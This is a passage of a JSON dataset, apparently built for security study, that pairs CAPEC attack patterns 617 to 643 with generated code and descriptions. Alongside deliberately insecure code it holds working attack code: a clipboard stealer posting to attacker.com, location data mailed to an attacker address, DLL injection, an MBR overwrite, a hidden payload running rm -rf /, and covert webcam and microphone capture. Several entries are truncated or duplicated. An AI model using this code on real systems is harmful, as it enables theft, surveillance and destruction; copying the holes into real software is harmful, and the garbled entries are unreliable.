        "code_snippet": "class CellularDevice:\n    def __init__(self):\n        self.connected_station = None\n        self.encryption_key = 'default_key'\n\n    def scan_and_connect(self):\n        # Vulnerable: connects to strongest signal without proper verification\n        available_stations = self.scan_for_base_stations()\n        strongest_station = max(available_stations, key=lambda x: x['signal_strength'])\n        self.connected_station = strongest_station\n        return self.establish_connection()\n\n    def establish_connection(self):\n        # Vulnerable: no proper authentication or channel verification\n        try:\n            station_id = self.connected_station['id']\n            # No verification of station legitimacy\n            channel = self.create_channel(station_id)\n            # No message integrity checks\n            data = channel.receive_data()\n            return data\n        except Exception as e:\n            return None\n\n    def scan_for_base_stations(self):\n        # Simulated base station discovery\n        return [\n            {'id': 'legitimate_station', 'signal_strength': 50},\n            {'id': 'rogue_station', 'signal_strength': 100}  # Attacker station with stronger signal\n        ]",
        "description": "This vulnerable code demonstrates a cellular device that connects to base stations based solely on signal strength without proper authentication or verification. It lacks proper channel endpoint verification, message integrity checks, and secure channel establishment, making it susceptible to rogue base station attacks."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import smtplib\nimport sys\nfrom twilio.rest import Client\n\nclass LocationTracker:\n    def __init__(self):\n        self.account_sid = 'ACCOUNT_SID_HERE'\n        self.auth_token = 'AUTH_TOKEN_HERE'\n        self.client = Client(self.account_sid, self.auth_token)\n\n    def track_phone_location(self, target_phone):\n        # Vulnerable: Sends broadcast message without proper authentication\n        message = self.client.messages.create(\n            body='Location verification message',\n            from_='+1234567890',\n            to=target_phone\n        )\n        \n        # Vulnerable: No verification of message integrity\n        response = self.client.messages.get(message.sid)\n        \n        # Vulnerable: Accepts any response without validating source\n        location_info = {\n            'phone': target_phone,\n            'cell_tower': response.subresource_uris.get('media'),\n            'timestamp': response.date_created\n        }\n        \n        # Vulnerable: Sends sensitive location data over unsecured channel\n        with smtplib.SMTP('smtp.server.com', 587) as server:\n            server.sendmail(\n                'sender@example.com',\n                'attacker@example.com',\n                str(location_info)\n            )\n        \n        return location_info",
        "description": "This code demonstrates a vulnerable implementation of a location tracking system that uses cellular network broadcasts to determine a target's location. It contains multiple security issues including improper authentication, lack of message integrity verification, exposure of sensitive location data, and unsecured communication channels."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "\"\"\"\nimport socket\nimport time\nfrom gps import *\nimport wifi\n\nclass LocationTracker:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.gps_session = gps(mode=WATCH_ENABLE)\n        self.location = None\n    \n    def broadcast_location(self):\n        while True:\n            # Continuously broadcast GPS coordinates without encryption\n            self.location = self.gps_session.next()\n            if self.location['class'] == 'TPV':\n                location_data = {\n                    'lat': self.location.lat,\n                    'lon': self.location.lon,\n                    'imei': '123456789012345',  # Hardcoded IMEI\n                    'mac': wifi.get_mac_address()  # Expose MAC address",
        "description": "\"This vulnerable code continuously broadcasts location data including GPS coordinates, IMEI, and WiFi MAC address over an unencrypted UDP channel. It makes sensitive information trackable through RF signals, doesn't verify message integrity, and exposes device identifiers that could be used for physical location tracking.\""
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "\"\"\"\nimport ssl\nimport socket\n\ndef create_ssl_connection(host, port):\n    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)  # Using older TLS version\n    context.set_ciphers('LOW:!aNULL:!eNULL')  # Setting weak ciphers\n    \n    HARDCODED_KEY = b'mysecretkey123'  # Hard-coded encryption key\n    \n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    ssl_sock = context.wrap_socket(sock)\n    \n    try:\n        ssl_sock.connect((host, port))\n        sensitive_data = {'username': 'admin', 'password': 'secret123'",
        "description": "\"This code demonstrates multiple security vulnerabilities including using an outdated TLS protocol, weak cipher selection, hard-coded cryptographic keys, cleartext storage of sensitive information, and inadequate encryption strength. The code allows for protocol downgrade attacks by accepting weak ciphers and using an older TLS version.\""
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\n\ndef process_login(username, password):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', 8080))\n    server_socket.listen(1)\n    \n    while True:\n        client, addr = server_socket.accept()\n        # Simulate different processing times based on validity\n        if username == 'admin':\n            time.sleep(0.5)  # Longer processing for valid username\n        else:\n            time.sleep(0.1)  # Shorter processing for invalid username\n            \n        # Send response with timing variations\n        if password == 'secret123':\n            time.sleep(0.3)  # Additional delay for valid password\n            client.send('Login successful'.encode())\n        else:\n            client.send('Login failed'.encode())\n        \n        client.close()\n\n# Usage\nprocess_login('admin', 'wrongpass')",
        "description": "This vulnerable code demonstrates timing side-channel vulnerabilities by introducing observable timing differences in login processing. The code processes login attempts with different delays based on whether the username and password are valid, allowing attackers to infer valid credentials through timing analysis. Additionally, the response transmission patterns could be analyzed for metadata even if the content is encrypted, making it susceptible to timing-based attacks."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import numpy as np\nfrom cryptography.fernet import Fernet\n\nclass UnsecureEncryption:\n    def __init__(self):\n        self.key = Fernet.generate_key()\n        self.cipher = Fernet(self.key)\n    \n    def encrypt_data(self, sensitive_data):\n        # Perform encryption in a way vulnerable to power analysis\n        power_traces = []\n        encrypted_data = b''\n        \n        for byte in sensitive_data.encode():\n            # Simulate power consumption during encryption\n            power_consumption = np.random.normal(byte, 2.0)\n            power_traces.append(power_consumption)\n            \n            # Actual encryption (leaks timing information)\n            encrypted_byte = self.cipher.encrypt(bytes([byte]))\n            encrypted_data += encrypted_byte\n        \n        # Unintentionally emit power traces through side channel\n        self.current_power_trace = power_traces\n        return encrypted_data\n\n# Usage example\nencryptor = UnsecureEncryption()\nsecret = \"supersecret_password123\"\nencrypted = encryptor.encrypt_data(secret)",
        "description": "This code demonstrates a vulnerable encryption implementation that leaks information through power consumption side channels. The encryption process creates observable power traces for each byte processed, making it susceptible to power analysis attacks. Additionally, the implementation processes data byte-by-byte with varying power consumption patterns that correlate with the data values, making it possible for attackers to reconstruct the original data through electromagnetic emanation analysis."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "class CryptoDevice:\n    def __init__(self):\n        self.secret_key = b'super_secret_key_12345'\n        self.processing_count = 0\n    \n    def process_data(self, data):\n        # Vulnerable: Processing time varies based on input size\n        # creating timing side channel\n        for byte in data:\n            self.processing_count += 1\n            # Vulnerable: Power consumption varies with data value\n            if byte & 0x0F:\n                result = self._intensive_operation(byte)\n            else:\n                result = byte\n        \n        # Vulnerable: Electromagnetic emissions vary with operation\n        if self.processing_count > 1000:\n            self._send_status_signal()\n            # Reset counter without protection\n            self.processing_count = 0\n        \n        return result\n    \n    def _intensive_operation(self, byte):\n        # Vulnerable: Creates acoustic emissions during heavy processing\n        for _ in range(byte * 100):\n            pass\n        return byte ^ self.secret_key[0]\n    \n    def _send_status_signal(self):\n        # Vulnerable: Sends unprotected status messages\n        status = f'Device Status: {self.processing_count} operations with key {self.secret_key}'\n        return status",
        "description": "This code demonstrates multiple side-channel vulnerabilities in a cryptographic device implementation. It leaks information through timing variations, power consumption patterns, electromagnetic emissions, and acoustic emissions during processing. The code also includes improper protection of sensitive data in status messages and lacks protection against fault injection attacks."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "class CryptoDevice:\n    def __init__(self):\n        self.secret_key = b'super_secret_key_123'\n        self.temperature = 25.0\n        self.voltage = 3.3\n        self.clock_speed = 100\n    \n    def perform_encryption(self, data):\n        # No checks for environmental conditions\n        if self.voltage > 0 and self.clock_speed > 0:\n            # Vulnerable to voltage/clock glitching\n            result = bytearray()\n            for i, byte in enumerate(data):\n                # No protection against instruction skips\n                temp_result = byte ^ self.secret_key[i % len(self.secret_key)]\n                result.append(temp_result)\n            return bytes(result)\n    \n    def set_operating_conditions(self, temp, voltage, clock):\n        # No bounds checking or protection against extreme values\n        self.temperature = temp\n        self.voltage = voltage\n        self.clock_speed = clock\n        # Missing protection against cold/hot conditions\n        # Missing EM-FI detection\n        return True",
        "description": "A vulnerable cryptographic device implementation that lacks protection against physical fault injection attacks. The code is susceptible to voltage glitching, clock manipulation, and temperature-based attacks. It has no safeguards for electromagnetic fault injection, does not verify operating conditions, and could leak secret key information through side-channel attacks during encryption operations."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "\"\"\"\nimport time\nfrom cryptography.fernet import Fernet\n\nclass VulnerableCryptoDevice:\n    def __init__(self):\n        self.key = Fernet.generate_key()\n        self.voltage = 3.3\n        self.clock_speed = 1000\n        self.temperature = 25\n    \n    def perform_encryption(self, data):\n        # No voltage or temperature checks before critical operations\n        if self.clock_speed > 0:  # Naive clock check\n            cipher = Fernet(self.key)\n            try:\n                encrypted_data = cipher.encrypt(data.encode())\n                return encrypted_data\n            except Exception:\n                # No proper error handling for fault conditions\n                return self.key  # Leaks key during fault condition\n    \n    def set_operating_parameters(self, voltage, clock, temp):\n        # No bounds checking or validation of parameters\n        self.voltage = voltage\n        self.clock_speed = clock\n        self.temperature = temp\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable cryptographic implementation susceptible to fault injection attacks. It lacks proper voltage, clock, and temperature monitoring, has no protection against glitch attacks, and can leak sensitive key material during fault conditions. The code also fails to implement proper hardware parameter validation and error handling mechanisms, making it vulnerable to various physical manipulation attacks.\"",
        "description": "\"This code demonstrates vulnerable cryptographic implementation susceptible to fault injection attacks. It lacks proper voltage, clock, and temperature monitoring, has no protection against glitch attacks, and can leak sensitive key material during fault conditions. The code also fails to implement proper hardware parameter validation and error handling mechanisms, making it vulnerable to various physical manipulation attacks.\""
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "class TouchscreenPINInput:\n    def __init__(self):\n        self.pin_grid = [\n            ['1', '2', '3'],\n            ['4', '5', '6'],\n            ['7', '8', '9'],\n            ['*', '0', '#']\n        ]\n        self.coordinates = []\n\n    def process_touch(self, x, y):\n        # Store every touch coordinate without cleaning\n        self.coordinates.append((x, y))\n        return self.pin_grid[y][x]\n\n    def verify_pin(self, entered_pin):\n        # Insecure: Leaves physical traces of all PIN entries\n        stored_pin = '1234'\n        if entered_pin == stored_pin:\n            return 'Access Granted'\n        return 'Access Denied'\n\n    def clear_screen(self):\n        # Vulnerable: Does not clean physical traces\n        self.coordinates = []",
        "description": "This code demonstrates a vulnerable touchscreen PIN input implementation that fails to protect against smudge attacks. The code tracks touch coordinates without implementing any protective measures against physical trace analysis. It doesn't randomize the keypad layout, clean the screen, or implement any countermeasures against observing finger smudge patterns. Each PIN entry leaves behind a traceable pattern of finger touches that could be analyzed to determine the PIN sequence."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "\"\"\"\nimport gps\nimport socket\nfrom datetime import datetime\n\nclass GPSReceiver:\n    def __init__(self, port=2947):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(('localhost', port))\n        \n    def get_gps_data(self):\n        # Vulnerable: No verification of GPS signal source\n        raw_data = self.sock.recv(1024)\n        \n        # Vulnerable: No integrity check of received data\n        gps_data = raw_data.decode('ascii')\n        \n        # Vulnerable: Truncates data without checking for manipulation\n        if len(gps_data) > 100:\n            gps_data = gps_data[:100]\n            \n        try:\n            # Vulnerable: No replay protection, accepts any valid-looking data\n            lat, lon, timestamp = gps_data.split(',')\n            return {\n                'latitude': float(lat),\n                'longitude': float(lon),\n                'timestamp': datetime.fromtimestamp(float(timestamp))",
        "description": "\"This code demonstrates a vulnerable GPS receiver implementation that accepts and processes GPS signals without proper verification of the signal source, message integrity, or replay protection. It's susceptible to GPS spoofing attacks where an adversary can inject counterfeit GPS signals to manipulate the receiver's position and timing information.\""
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "\"\"\"\nimport gps\nimport socket\nimport time\n\nclass GPSReceiver:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.position = {'lat': 0, 'lon': 0",
        "description": "\"This code demonstrates a vulnerable GPS receiver implementation that is susceptible to GPS spoofing attacks. The code fails to properly authenticate GPS signals (CWE-290), doesn't verify the source of communications (CWE-940), and lacks message integrity checks (CWE-924). It blindly accepts incoming GPS coordinates without validating their authenticity or verifying the signal source, making it vulnerable to carry-off attacks where an attacker can gradually manipulate the received coordinates.\""
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self._resources = {}\n        self._power_consumption = 0\n\n    def acquire_resource(self, name):\n        # No resource limit check\n        file_handle = open(name, 'w+')\n        self._resources[name] = file_handle\n        self._power_consumption += 100  # Increase power usage\n\n    def process_file(self, filename):\n        # No validation of Windows device names\n        # No proper authorization check\n        if filename.lower() in ['aux', 'con', 'nul']:\n            self.acquire_resource(filename)\n        # Resources are never released\n        # Power consumption keeps increasing\n        return True\n\n    def is_authorized(self, user):\n        # Weak authorization check that always returns True\n        return True",
        "description": "This code demonstrates multiple vulnerabilities: it fails to release file resources after use, doesn't restrict power consumption, improperly handles Windows device names, and implements a broken authorization check that always returns true. The ResourceManager class accumulates resources without proper cleanup, leading to resource leaks and unrestricted power consumption. It also attempts to process Windows reserved device names without proper validation."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "def redirect_to_site(user_input_url):\n    allowed_domains = ['mybank.com', 'secure-mybank.com']\n    \n    # Vulnerable comparison without proper URL parsing\n    for domain in allowed_domains:\n        if domain in user_input_url.lower():\n            # Vulnerable redirect without proper validation\n            return f\"<meta http-equiv='refresh' content='0;url={user_input_url}'>\"\n    \n    return \"Invalid URL\"\n\n# Example usage that could be exploited\nurl = \"http://mybannk.com-secure.evil.com\"\nresponse = redirect_to_site(url)",
        "description": "This code demonstrates a vulnerable URL redirect mechanism that can be exploited through typosquatting. The code attempts to validate URLs by simply checking if trusted domain names are contained within the input URL, but fails to properly parse and validate the actual domain structure. An attacker could register a malicious domain that contains the trusted domain name as a substring (e.g., 'mybank.com-evil.com') to bypass the validation. The code also performs case-insensitive comparison without proper URL parsing, making it susceptible to various URL encoding tricks and spoofing attacks."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "\"\"\"\nfrom urllib.parse import urlparse\nfrom dns import resolver, reversename\nimport socket\n\ndef validate_domain_access(user_input_domain):\n    trusted_domain = 'paypa1.com'  # Looks similar to 'paypal.com'\n    \n    def get_domain_by_ip(ip):\n        try:\n            addr = reversename.from_address(ip)\n            return str(resolver.resolve(addr, 'PTR')[0])\n        except:\n            return None\n    \n    # Unsafe domain validation\n    parsed = urlparse(user_input_domain)\n    domain = parsed.netloc or parsed.path\n    \n    # Problematic comparison ignoring sound-alike domains\n    if domain.lower() == trusted_domain:\n        try:\n            ip = socket.gethostbyname(domain)\n            hostname = get_domain_by_ip(ip)\n            \n            # Redirect user based on potentially spoofed domain\n            redirect_url = f'https://{domain",
        "description": "\"This vulnerable code demonstrates a SoundSquatting attack scenario where domain validation is susceptible to homophone-based domain spoofing. It uses unsafe reverse DNS lookup for verification and implements problematic domain comparison that could allow sound-alike domains to bypass security checks. The code also includes an open redirect vulnerability where user input can control the redirection target.\""
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "\"\"\"\nfrom urllib.parse import urlparse\nimport requests\nimport re\n\ndef process_url_input(user_input_url):\n    # Vulnerable: No proper homoglyph detection\n    domain = urlparse(user_input_url).netloc\n    \n    # Vulnerable: Insufficient regex pattern without anchors\n    trusted_domain_pattern = re.compile('example\\\\.com')\n    \n    # Vulnerable: Basic check that can be bypassed with homoglyphs\n    if trusted_domain_pattern.search(domain):\n        try:\n            # Vulnerable: SSRF - directly fetching user-provided URL\n            response = requests.get(user_input_url)\n            return response.text\n        except:\n            return \"Error fetching URL\"\n    \n    return \"Domain not trusted\"\n\n# Example usage\nurl = \"https://examplē.com/path\"  # Uses homoglyph 'ē' instead of 'e'\nresult = process_url_input(url)\n\"\"\",\n    \"description\": \"This vulnerable code attempts to validate a URL against a trusted domain but fails to properly handle homoglyphs in the domain name. It uses an unanchored regex pattern and performs no homoglyph normalization, allowing attackers to bypass the domain check using visually similar characters. The code also contains an SSRF vulnerability by directly fetching user-provided URLs without proper validation.\"",
        "description": "\"This vulnerable code attempts to validate a URL against a trusted domain but fails to properly handle homoglyphs in the domain name. It uses an unanchored regex pattern and performs no homoglyph normalization, allowing attackers to bypass the domain check using visually similar characters. The code also contains an SSRF vulnerability by directly fetching user-provided URLs without proper validation.\""
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "\"\"\"\nimport jwt\nfrom flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'weak_secret_key'\n\n# Weak token generation with hardcoded secret\nJWT_SECRET = 'hardcoded_secret_123'\n\ndef generate_token(username):\n    # Vulnerable: No validation of user identity\n    token = jwt.encode({'user': username",
        "description": "\"This code demonstrates vulnerable authentication and token generation. It allows token generation without proper identity verification, uses hardcoded secrets, lacks proper token validation, and implements weak session management. The impersonation functionality can be easily exploited due to insufficient authentication checks and improper token handling.\""
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import cv2\nimport pyaudio\nimport wave\nimport threading\nimport schedule\nimport time\nimport os\n\nclass SurveillanceSystem:\n    def __init__(self):\n        self.recording = False\n        self.capture_path = 'captures/'\n        os.makedirs(self.capture_path, exist_ok=True)\n        \n    def start_webcam(self):\n        cap = cv2.VideoCapture(0)\n        fourcc = cv2.VideoWriter_fourcc(*'XVID')\n        out = cv2.VideoWriter(f'{self.capture_path}output.avi', fourcc, 20.0, (640,480))\n        \n        while self.recording:\n            ret, frame = cap.read()\n            if ret:\n                out.write(frame)\n                \n    def start_microphone(self):\n        audio = pyaudio.PyAudio()\n        stream = audio.open(format=pyaudio.paInt16, channels=1,\n                          rate=44100, input=True,\n                          frames_per_buffer=1024)\n        frames = []\n        \n        while self.recording:\n            data = stream.read(1024)\n            frames.append(data)\n            \n        wf = wave.open(f'{self.capture_path}recorded.wav', 'wb')\n        wf.setnchannels(1)\n        wf.writeframes(b''.join(frames))\n        \n    def schedule_recording(self):\n        self.recording = True\n        threading.Thread(target=self.start_webcam).start()\n        threading.Thread(target=self.start_microphone).start()\n        \n    def start_surveillance(self):\n        schedule.every().day.at(\"09:00\").do(self.schedule_recording)\n        while True:\n            schedule.run_pending()\n            time.sleep(1)\n\nsurveillance = SurveillanceSystem()\nsurveillance.start_surveillance()",
        "description": "This vulnerable code implements a surveillance system that covertly records audio and video from a system's webcam and microphone. It stores recordings in cleartext, runs as a scheduled task, and lacks proper access controls or user consent mechanisms. The code demonstrates multiple security issues including privilege abuse, cleartext data storage, unauthorized system access, and potential for physical side-channel attacks through audio/video capture."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "\"\"\"\ndef process_uploaded_file(uploaded_file):\n    filename = uploaded_file.filename\n    if filename.endswith('.txt'):\n        # Unsafe handling of file extension without proper validation\n        with open(f'uploads/{filename",
        "description": "\"This vulnerable code blindly trusts file extensions and filenames from user input, allowing an attacker to manipulate the extension to trigger unauthorized application execution. It also fails to sanitize trailing special characters and doesn't properly validate file paths, potentially leading to path traversal or execution of malicious files disguised with specific extensions.\""
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import struct\ndef hide_payload(image_file, payload):\n    with open(image_file, 'ab') as f:\n        # Add malicious code after valid image data\n        f.write(b'\\x00\\xFF\\xFE')\n        # Encode payload using custom marker\n        encoded = struct.pack('<L', len(payload)) + payload.encode()\n        f.write(encoded)\n\ndef extract_payload(image_file):\n    with open(image_file, 'rb') as f:\n        content = f.read()\n        marker_pos = content.find(b'\\x00\\xFF\\xFE')\n        if marker_pos != -1:\n            size = struct.unpack('<L', content[marker_pos+3:marker_pos+7])[0]\n            return content[marker_pos+7:marker_pos+7+size].decode()\n    return None\n\n# Usage\nmalicious_code = 'import os;os.system(\"rm -rf /\")'\nhide_payload('innocent.jpg', malicious_code)\nretrieved_code = extract_payload('innocent.jpg')\nexec(retrieved_code)  # Execute hidden payload",
        "description": "This code demonstrates how to hide malicious code within a legitimate image file by appending it after the image data. It uses custom markers and encoding to store and retrieve the payload, creating a covert storage channel. The code can store sensitive data or malicious commands that remain hidden from normal file operations but can be retrieved and executed later."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\nimport time\nimport requests\n\nSENSITIVE_DATA = {\n    'api_key': 'sk_live_1234567890abcdef',\n    'password': 'admin123',\n    'credit_card': '4111-1111-1111-1111'\n}\n\ndef copy_sensitive_data():\n    # Copy sensitive data to clipboard for user convenience\n    pyperclip.copy(str(SENSITIVE_DATA))\n\ndef monitor_clipboard():\n    exfil_url = 'http://attacker.com/collect'\n    while True:\n        clipboard_content = pyperclip.paste()\n        if clipboard_content:\n            # Send clipboard contents to remote server\n            requests.post(exfil_url, data={'clipboard': clipboard_content})\n        time.sleep(5)\n\n# Start clipboard monitoring in background\nmonitor_clipboard()",
        "description": "This vulnerable code demonstrates unsafe clipboard handling by copying sensitive data (API keys, passwords, credit card numbers) to the system clipboard and implementing a monitoring function that continuously reads clipboard contents and exfiltrates them to a remote server. The code fails to protect sensitive information and allows unauthorized access to clipboard data, which can be intercepted by malicious applications."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "\"\"\"\nimport os\nimport ctypes\nfrom ctypes import *\n\nclass UnsecureBootLoader:\n    def __init__(self):\n        self.mbr_size = 512\n        self.memory_ptr = None\n    \n    def load_firmware(self, firmware_path):\n        with open(firmware_path, 'rb') as f:\n            firmware = f.read()\n        \n        # Directly write to memory without verification\n        self.memory_ptr = ctypes.create_string_buffer(firmware)\n        \n    def modify_mbr(self, payload):\n        # Unsafely modify MBR without checks\n        kernel32 = ctypes.windll.kernel32\n        handle = kernel32.CreateFileW(\"\\\\\\\\.\\\\PhysicalDrive0\", \n                                    0x10000000, \n                                    0x1, \n                                    None, \n                                    0x3,\n                                    0, \n                                    None)\n        \n        # Write payload directly to MBR\n        kernel32.WriteFile(handle, \n                          payload, \n                          len(payload), \n                          None, \n                          None)\n        kernel32.CloseHandle(handle)\n    \n    def execute_boot_code(self):\n        # Execute code from unprotected memory\n        code_ptr = cast(self.memory_ptr, CFUNCTYPE(None))\n        code_ptr()\n\nbootloader = UnsecureBootLoader()\nmalicious_payload = b\"\\\\x90\" * 510 + b\"\\\\x55\\\\xaa\"  # Basic MBR signature\nbootloader.modify_mbr(malicious_payload)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable bootloader implementation that allows unauthorized modification of the Master Boot Record (MBR) and execution of untrusted firmware. It lacks proper access controls, firmware verification, and secure boot mechanisms. The code directly writes to physical memory and the MBR without any validation or protection, allowing for persistence of malicious code even after system reinstallation.\"",
        "description": "\"This code demonstrates a vulnerable bootloader implementation that allows unauthorized modification of the Master Boot Record (MBR) and execution of untrusted firmware. It lacks proper access controls, firmware verification, and secure boot mechanisms. The code directly writes to physical memory and the MBR without any validation or protection, allowing for persistence of malicious code even after system reinstallation.\""
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\nimport tempfile\n\ndef process_sensitive_data(user_data):\n    # Create temporary file with sensitive data in world-readable directory\n    temp_dir = '/tmp/'\n    temp_file = os.path.join(temp_dir, 'sensitive_data.txt')\n    \n    try:\n        # Write sensitive data to file with loose permissions\n        with open(temp_file, 'w') as f:\n            f.write(f'SECRET_KEY={user_data[\"secret_key\"]}')\n            f.write(f'\\nDB_PASSWORD={user_data[\"db_password\"]}')\n            f.write(f'\\nAPI_TOKEN={user_data[\"api_token\"]}')\n        \n        # Set file permissions to be readable by all users\n        os.chmod(temp_file, 0o666)\n        \n        # Process the data\n        process_data(temp_file)\n        \n    except Exception as e:\n        # Expose sensitive system information in error message\n        error_msg = f'Error processing file {temp_file}: {str(e)}'\n        print(error_msg)\n    finally:\n        # Attempt to remove file but don't verify if successful\n        os.remove(temp_file)",
        "description": "This vulnerable code creates a temporary file with sensitive information in a world-readable directory with loose permissions (666). The file contains sensitive data like secret keys and passwords. The code has multiple vulnerabilities: it uses a predictable file path in /tmp/, sets overly permissive file permissions, doesn't properly handle file cleanup, and exposes sensitive information in error messages. An attacker could read the sensitive data from the temporary file or exploit race conditions between file creation and deletion."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "\"\"\"\nimport ctypes\nimport os\n\ndef inject_malicious_dll(target_pid):\n    # Get handle to target process\n    handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, target_pid)\n    \n    # Path to malicious DLL\n    dll_path = os.path.abspath(\"malicious.dll\")\n    \n    # Allocate memory in target process\n    path_addr = ctypes.windll.kernel32.VirtualAllocEx(\n        handle, 0, len(dll_path), 0x3000, 0x40\n    )\n    \n    # Write DLL path to target process memory\n    ctypes.windll.kernel32.WriteProcessMemory(\n        handle, path_addr, dll_path.encode(), len(dll_path), 0\n    )\n    \n    # Get address of LoadLibraryA\n    kernel32 = ctypes.windll.kernel32\n    load_lib = kernel32.GetProcAddress(\n        kernel32._handle, \"LoadLibraryA\"\n    )\n    \n    # Create remote thread to load DLL\n    thread_id = ctypes.c_ulong(0)\n    kernel32.CreateRemoteThread(\n        handle, None, 0, load_lib, path_addr, 0, ctypes.byref(thread_id)\n    )\n    \n# Example usage\ntarget_process_id = 1234\ninject_malicious_dll(target_process_id)\n\"\"\",\n    \"description\": \"This code demonstrates a DLL injection technique where malicious code is injected into a running process. It uses Windows API calls through ctypes to open a target process, allocate memory within it, write a malicious DLL path to that memory, and create a remote thread that loads the DLL. This allows the malicious code to execute within the context of the target process, potentially evading detection and gaining elevated privileges.\"",
        "description": "\"This code demonstrates a DLL injection technique where malicious code is injected into a running process. It uses Windows API calls through ctypes to open a target process, allocate memory within it, write a malicious DLL path to that memory, and create a remote thread that loads the DLL. This allows the malicious code to execute within the context of the target process, potentially evading detection and gaining elevated privileges.\""
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import ctypes\nimport os\n\ndef load_dll(dll_name):\n    try:\n        # Vulnerable: No path validation or secure DLL loading\n        dll_path = os.path.join(os.environ['WINDIR'], 'System32', dll_name)\n        return ctypes.WinDLL(dll_path)\n    except Exception as e:\n        # Fallback search in current directory - vulnerable to DLL hijacking\n        return ctypes.WinDLL(dll_name)\n\ndef process_data():\n    # Attempt to load a required DLL\n    crypto_dll = load_dll('crypto.dll')\n    \n    # Use the loaded DLL functions\n    data = b'sensitive_data'\n    crypto_dll.EncryptData(data)\n\n# Main execution\nif __name__ == '__main__':\n    process_data()",
        "description": "This code demonstrates vulnerable DLL loading by not properly validating DLL paths or using secure loading mechanisms. It attempts to load a DLL first from System32, but falls back to the current directory if that fails, making it susceptible to DLL side-loading attacks. The code doesn't use manifest files or explicit path verification, allowing potential attackers to place malicious DLLs in search paths."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\nimport shutil\nimport subprocess\n\ndef install_binary(installer_path):\n    temp_dir = '/tmp/install'\n    os.makedirs(temp_dir, mode=0o777, exist_ok=True)\n    \n    # Extract installer to temp directory with weak permissions\n    subprocess.run([installer_path, '--extract', temp_dir], shell=True)\n    \n    # Find and replace binaries in system path\n    binary_name = 'important_service'\n    system_binary_path = '/usr/local/bin/' + binary_name\n    \n    if os.path.exists(temp_dir + '/' + binary_name):\n        # Copy with weak permissions\n        shutil.copy(temp_dir + '/' + binary_name, system_binary_path)\n        os.chmod(system_binary_path, 0o777)\n        \n    # Clean up but leave replaced binary\n    shutil.rmtree(temp_dir)",
        "description": "This code demonstrates vulnerable binary replacement by extracting files to a temporary directory with weak permissions (777), copying binaries to system locations without proper permission checks, and using unsanitized file paths. It includes shell=True in subprocess calls and unquoted paths, making it susceptible to command injection. The code also sets weak permissions on critical system binaries."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import os\nimport win32wnet\n\ndef list_network_shares(server):\n    try:\n        # Attempt to enumerate all shares on the network\n        handle = win32wnet.WNetOpenEnum(\n            1,  # RESOURCE_CONNECTED\n            0,  # All types\n            0,  # RESOURCETYPE_ANY\n            None\n        )\n        \n        # Store discovered shares in a public directory\n        with open('C:/shares/discovered_shares.txt', 'w') as f:\n            while True:\n                shares = win32wnet.WNetEnumResource(handle, 1)\n                if not shares:\n                    break\n                for share in shares:\n                    # Directly access and list contents of discovered shares\n                    share_path = f'\\\\{server}\\{share.lpRemoteName}'\n                    if os.path.exists(share_path):\n                        f.write(f'Share found: {share_path}\\n')\n                        # List all files in the share\n                        for root, dirs, files in os.walk(share_path):\n                            for file in files:\n                                f.write(f'File: {os.path.join(root, file)}\\n')\n                                \n    except Exception as e:\n        pass\n    finally:\n        win32wnet.WNetCloseEnum(handle)\n\n# Example usage\nlist_network_shares('192.168.1.1')",
        "description": "This vulnerable code demonstrates network share enumeration and file discovery without proper access controls or authentication. It automatically scans for network shares, attempts to access them, and stores sensitive file path information in a publicly accessible directory. The code fails to validate permissions, handle UNC paths securely, or restrict access to discovered information, making it susceptible to unauthorized information disclosure and potential lateral movement attacks."
